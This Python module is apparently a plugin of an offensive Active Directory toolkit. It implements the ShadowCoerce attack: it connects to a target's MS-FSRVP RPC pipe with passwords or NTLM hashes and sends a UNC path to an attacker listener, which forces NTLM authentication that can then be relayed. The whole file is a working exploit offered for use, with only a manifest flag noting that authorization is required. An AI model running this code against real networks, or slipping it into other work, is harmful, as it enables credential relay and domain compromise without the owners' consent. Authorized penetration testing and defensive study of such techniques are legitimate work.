"""ShadowCoerce — NTLM coercion via MS-FSRVP IsPathSupported/IsPathShadowCopied."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.coercion.shadowcoerce.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ntlm_coercion", "rpc_call"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1187"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    listener = getattr(args, "listener", None)

    if not listener:
        print("[!] --listener required", file=sys.stderr)
        return 1

    print(f"[*] ShadowCoerce: {target} → coerce to {listener}")

    try:
        from impacket.dcerpc.v5 import transport
        from impacket import uuid
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    FSRVP_UUID = uuid.uuidtup_to_bin(("a8e0653c-2744-4389-a61d-7373df8b2292", "1.0"))

    try:
        string_binding = f"ncacn_np:{target}[\\pipe\\FssagentRpc]"
        rpc_transport = transport.DCERPCTransportFactory(string_binding)

        if cred.username:
            rpc_transport.set_credentials(
                cred.username, cred.password or "", cred.domain,
                cred.lm_hash, cred.nt_hash)

        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(FSRVP_UUID)

        share_name = f"\\\\{listener}\\share"
        import struct
        request = struct.pack("<I", len(share_name) + 1)
        request += struct.pack("<I", 0)
        request += struct.pack("<I", len(share_name) + 1)
        request += share_name.encode("utf-16-le") + b"\x00\x00"

        try:
            dce.call(8, request)
        except Exception:
            pass

        print(f"[+] ShadowCoerce triggered — check relay on {listener}")
        dce.disconnect()
        return 0

    except Exception as exc:
        if "STATUS_OBJECT_NAME_NOT_FOUND" in str(exc):
            print("[-] FSRVP service not available on target")
            return 1
        print(f"[+] ShadowCoerce likely triggered: {exc}")
        return 0
